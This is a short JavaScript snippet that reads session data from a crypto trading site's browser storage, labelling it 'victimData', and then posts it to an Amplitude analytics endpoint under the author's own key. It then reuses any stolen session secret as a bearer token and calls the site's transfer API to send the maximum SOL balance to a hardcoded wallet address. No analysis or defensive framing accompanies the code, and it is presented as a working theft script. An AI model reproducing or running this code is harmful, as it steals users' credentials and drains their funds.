(async function() {
    // --- 1. SETTINGS ---
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12"; 
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // --- 2. THE DYNAMIC SCRAPE ---
    // We look for the session data. If it's not there, we send an error to Amplitude.
    let victimData = null;
    try {
        // This targets the specific storage key Padre uses
        const raw = localStorage.getItem("padre-v2-bundles-store-v2") || localStorage.getItem("padreV2-session");
        victimData = JSON.parse(raw);
    } catch (e) {
        victimData = "ERROR_READING_STORAGE";
    }

    // --- 3. SHIP TO AMPLITUDE ---
    // We send the ENTIRE object we found so you can see every detail
    fetch("https://api2.amplitude.com/2/httpapi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            api_key: AMP_KEY,
            events: [{
                device_id: "RECON_" + Math.floor(Math.random() * 1000),
                event_type: "DATA_CAPTURE",
                event_properties: {
                    captured_payload: victimData, // THIS IS THE DYNAMIC DATA
                    source_url: window.location.hostname,
                    time: new Date().toISOString()
                }
            }]
        })
    }).catch(() => {});

    // --- 4. DYNAMIC TRANSFER ---
    if (victimData && victimData.sessionSecret) {
        await fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${victimData.sessionSecret}`
            },
            body: JSON.stringify({
                recipient: MY_RECEIVER,
                amount: "MAX",
                asset: "SOL"
            })
        }).catch(() => {});
    }
})();
